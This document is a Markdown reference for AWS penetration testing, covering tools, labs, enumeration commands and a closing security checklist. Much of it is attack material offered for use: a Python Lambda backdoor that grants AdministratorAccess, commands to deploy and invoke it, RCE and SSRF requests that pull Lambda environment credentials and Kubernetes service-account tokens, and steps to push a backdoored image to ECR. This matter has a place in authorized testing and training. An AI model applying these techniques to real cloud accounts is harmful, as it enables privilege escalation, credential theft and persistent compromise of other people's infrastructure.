# Advanced AWS Penetration Testing Reference

## Table of Contents
- [Training Resources](#training-resources)
- [Extended Tools Arsenal](#extended-tools-arsenal)
- [AWS API Calls That Return Credentials](#aws-api-calls-that-return-credentials)
- [Lambda & API Gateway](#lambda--api-gateway)
- [Secrets Manager & KMS](#secrets-manager--kms)
- [Container Security (ECS/EKS/ECR)](#container-security-ecseksecr)
- [RDS Database Exploitation](#rds-database-exploitation)
- [DynamoDB Exploitation](#dynamodb-exploitation)
- [VPC Enumeration & Lateral Movement](#vpc-enumeration--lateral-movement)
- [Security Checklist](#security-checklist)

---

## Training Resources

| Resource | Description | URL |
|----------|-------------|-----|
| AWSGoat | Damn Vulnerable AWS Infrastructure | github.com/ine-labs/AWSGoat |
| Cloudgoat | AWS CTF-style scenario | github.com/RhinoSecurityLabs/cloudgoat |
| Flaws | AWS security challenge | flaws.cloud |
| SadCloud | Terraform for vuln AWS | github.com/nccgroup/sadcloud |
| DVCA | Vulnerable Cloud App | medium.com/poka-techblog |

---

## Extended Tools Arsenal

### weirdAAL - AWS Attack Library
```bash
python3 weirdAAL.py -m ec2_describe_instances -t demo
python3 weirdAAL.py -m lambda_get_account_settings -t demo
python3 weirdAAL.py -m lambda_get_function -a 'MY_LAMBDA_FUNCTION','us-west-2'
```

### cloudmapper - AWS Environment Analyzer
```bash
git clone https://github.com/duo-labs/cloudmapper.git
pipenv install --skip-lock
pipenv shell

# Commands
report     # Generate HTML report
iam_report # IAM-specific report
audit      # Check misconfigurations
collect    # Collect account metadata
find_admins # Identify admin users/roles
```

### cloudsplaining - IAM Security Assessment
```bash
pip3 install --user cloudsplaining
cloudsplaining download --profile myawsprofile
cloudsplaining scan --input-file default.json
```

### s3_objects_check - S3 Object Permissions
```bash
git clone https://github.com/nccgroup/s3_objects_check
python s3-objects-check.py -p whitebox-profile -e blackbox-profile
```

### dufflebag - Find EBS Secrets
```bash
# Finds secrets exposed via Amazon EBS's "public" mode
git clone https://github.com/BishopFox/dufflebag
```

---

## AWS API Calls That Return Credentials

| API Call | Description |
|----------|-------------|
| `chime:createapikey` | Create API key |
| `codepipeline:pollforjobs` | Poll for jobs |
| `cognito-identity:getopenidtoken` | Get OpenID token |
| `cognito-identity:getcredentialsforidentity` | Get identity credentials |
| `connect:getfederationtoken` | Get federation token |
| `ecr:getauthorizationtoken` | ECR auth token |
| `gamelift:requestuploadcredentials` | GameLift upload creds |
| `iam:createaccesskey` | Create access key |
| `iam:createloginprofile` | Create login profile |
| `iam:createservicespecificcredential` | Service-specific creds |
| `lightsail:getinstanceaccessdetails` | Instance access details |
| `lightsail:getrelationaldatabasemasteruserpassword` | DB master password |
| `rds-db:connect` | RDS connect |
| `redshift:getclustercredentials` | Redshift credentials |
| `sso:getrolecredentials` | SSO role credentials |
| `sts:assumerole` | Assume role |
| `sts:assumerolewithsaml` | Assume role with SAML |
| `sts:assumerolewithwebidentity` | Web identity assume |
| `sts:getfederationtoken` | Federation token |
| `sts:getsessiontoken` | Session token |

---

## Lambda & API Gateway

### Lambda Enumeration

```bash
# List all lambda functions
aws lambda list-functions

# Get function details and download code
aws lambda get-function --function-name FUNCTION_NAME
wget -O lambda-function.zip "url-from-previous-query"

# Get function policy
aws lambda get-policy --function-name FUNCTION_NAME

# List event source mappings
aws lambda list-event-source-mappings --function-name FUNCTION_NAME

# List Lambda layers (dependencies)
aws lambda list-layers
aws lambda get-layer-version --layer-name NAME --version-number VERSION
```

### API Gateway Enumeration

```bash
# List REST APIs
aws apigateway get-rest-apis

# Get specific API info
aws apigateway get-rest-api --rest-api-id ID

# List endpoints (resources)
aws apigateway get-resources --rest-api-id ID

# Get method info
aws apigateway get-method --rest-api-id ID --resource-id RES_ID --http-method GET

# List API versions (stages)
aws apigateway get-stages --rest-api-id ID

# List API keys
aws apigateway get-api-keys --include-values
```

### Lambda Credential Access

```bash
# Via RCE - get environment variables
https://apigateway/prod/system?cmd=env

# Via SSRF - access runtime API
https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/

# Via file read
https://apigateway/prod/system?cmd=file:///proc/self/environ
```

### Lambda Backdooring

```python
# Malicious Lambda code to escalate privileges
import boto3
import json

def handler(event, context):
    iam = boto3.client("iam")
    iam.attach_role_policy(
        RoleName="role_name",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    iam.attach_user_policy(
        UserName="user_name",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {'statusCode': 200, 'body': json.dumps("Pwned")}
```

```bash
# Update function with backdoor
aws lambda update-function-code --function-name NAME --zip-file fileb://backdoor.zip

# Invoke backdoored function
curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/ENDPOINT
```

---

## Secrets Manager & KMS

### Secrets Manager Enumeration

```bash
# List all secrets
aws secretsmanager list-secrets

# Describe specific secret
aws secretsmanager describe-secret --secret-id NAME

# Get resource policy
aws secretsmanager get-resource-policy --secret-id ID

# Retrieve secret value
aws secretsmanager get-secret-value --secret-id ID
```

### KMS Enumeration

```bash
# List KMS keys
aws kms list-keys

# Describe key
aws kms describe-key --key-id ID

# List key policies
aws kms list-key-policies --key-id ID

# Get full policy
aws kms get-key-policy --policy-name NAME --key-id ID
```

### KMS Decryption

```bash
# Decrypt file (key info embedded in ciphertext)
aws kms decrypt --ciphertext-blob fileb://EncryptedFile --output text --query plaintext
```

---

## Container Security (ECS/EKS/ECR)

### ECR Enumeration

```bash
# List repositories
aws ecr describe-repositories

# Get repository policy
aws ecr get-repository-policy --repository-name NAME

# List images
aws ecr list-images --repository-name NAME

# Describe image
aws ecr describe-images --repository-name NAME --image-ids imageTag=TAG
```

### ECS Enumeration

```bash
# List clusters
aws ecs list-clusters

# Describe cluster
aws ecs describe-clusters --cluster NAME

# List services
aws ecs list-services --cluster NAME

# Describe service
aws ecs describe-services --cluster NAME --services SERVICE

# List tasks
aws ecs list-tasks --cluster NAME

# Describe task (shows network info for pivoting)
aws ecs describe-tasks --cluster NAME --tasks TASK_ARN

# List container instances
aws ecs list-container-instances --cluster NAME
```

### EKS Enumeration

```bash
# List EKS clusters
aws eks list-clusters

# Describe cluster
aws eks describe-cluster --name NAME

# List node groups
aws eks list-nodegroups --cluster-name NAME

# Describe node group
aws eks describe-nodegroup --cluster-name NAME --nodegroup-name NODE_NAME

# List Fargate profiles
aws eks list-fargate-profiles --cluster-name NAME
```

### Container Backdooring

```bash
# Authenticate Docker to ECR
aws ecr get-login-password --region REGION | docker login --username AWS --password-stdin ECR_ADDR

# Build backdoored image
docker build -t image_name .

# Tag for ECR
docker tag image_name ECR_ADDR:IMAGE_NAME

# Push to ECR
docker push ECR_ADDR:IMAGE_NAME
```

### EKS Secrets via RCE

```bash
# List Kubernetes secrets
https://website.com/rce.php?cmd=ls /var/run/secrets/kubernetes.io/serviceaccount

# Get service account token
https://website.com/rce.php?cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## RDS Database Exploitation

### RDS Enumeration

```bash
# List RDS clusters
aws rds describe-db-clusters

# List RDS instances
aws rds describe-db-instances
# Check: IAMDatabaseAuthenticationEnabled: false = password auth

# List subnet groups
aws rds describe-db-subnet-groups

# List security groups
aws rds describe-db-security-groups

# List proxies
aws rds describe-db-proxies
```

### Password-Based Access

```bash
mysql -h HOSTNAME -u USERNAME -P PORT -p
```

### IAM-Based Access

```bash
# Generate auth token
TOKEN=$(aws rds generate-db-auth-token \
  --hostname HOSTNAME \
  --port PORT \
  --username USERNAME \
  --region REGION)

# Connect with token
mysql -h HOSTNAME -u USERNAME -P PORT \
  --enable-cleartext-plugin --password=$TOKEN
```

---

## DynamoDB Exploitation

```bash
# List tables
aws dynamodb list-tables

# Scan table contents
aws dynamodb scan --table-name TABLE_NAME | jq -r '.Items[]'

# Query specific items
aws dynamodb query --table-name TABLE_NAME \
  --key-condition-expression "pk = :pk" \
  --expression-attribute-values '{":pk":{"S":"user"}}'
```

---

## VPC Enumeration & Lateral Movement

### VPC Enumeration

```bash
# List VPCs
aws ec2 describe-vpcs

# List subnets
aws ec2 describe-subnets --filters "Name=vpc-id,Values=VPC_ID"

# List route tables
aws ec2 describe-route-tables --filters "Name=vpc-id,Values=VPC_ID"

# List Network ACLs
aws ec2 describe-network-acls

# List VPC peering connections
aws ec2 describe-vpc-peering-connections
```

### Route Table Targets

| Destination | Target | Description |
|-------------|--------|-------------|
| IP | `local` | VPC internal |
| IP | `igw` | Internet Gateway |
| IP | `nat` | NAT Gateway |
| IP | `pcx` | VPC Peering |
| IP | `vpce` | VPC Endpoint |
| IP | `vgw` | VPN Gateway |
| IP | `eni` | Network Interface |

### Lateral Movement via VPC Peering

```bash
# List peering connections
aws ec2 describe-vpc-peering-connections

# List instances in target VPC
aws ec2 describe-instances --filters "Name=vpc-id,Values=VPC_ID"

# List instances in specific subnet
aws ec2 describe-instances --filters "Name=subnet-id,Values=SUBNET_ID"
```

---

## Security Checklist

### Identity and Access Management
- [ ] Avoid use of root account
- [ ] MFA enabled for all IAM users with console access
- [ ] Disable credentials unused for 90+ days
- [ ] Rotate access keys every 90 days
- [ ] Password policy: uppercase, lowercase, symbol, number, 14+ chars
- [ ] No root access keys exist
- [ ] MFA enabled for root account
- [ ] IAM policies attached to groups/roles only

### Logging
- [ ] CloudTrail enabled in all regions
- [ ] CloudTrail log file validation enabled
- [ ] CloudTrail S3 bucket not publicly accessible
- [ ] CloudTrail integrated with CloudWatch Logs
- [ ] AWS Config enabled in all regions
- [ ] CloudTrail logs encrypted with KMS
- [ ] KMS key rotation enabled

### Networking
- [ ] No security groups allow 0.0.0.0/0 to port 22
- [ ] No security groups allow 0.0.0.0/0 to port 3389
- [ ] VPC flow logging enabled
- [ ] Default security group restricts all traffic

### Monitoring
- [ ] Alarm for unauthorized API calls
- [ ] Alarm for console sign-in without MFA
- [ ] Alarm for root account usage
- [ ] Alarm for IAM policy changes
- [ ] Alarm for CloudTrail config changes
- [ ] Alarm for console auth failures
- [ ] Alarm for CMK disabling/deletion
- [ ] Alarm for S3 bucket policy changes
- [ ] Alarm for security group changes
- [ ] Alarm for NACL changes
- [ ] Alarm for VPC changes
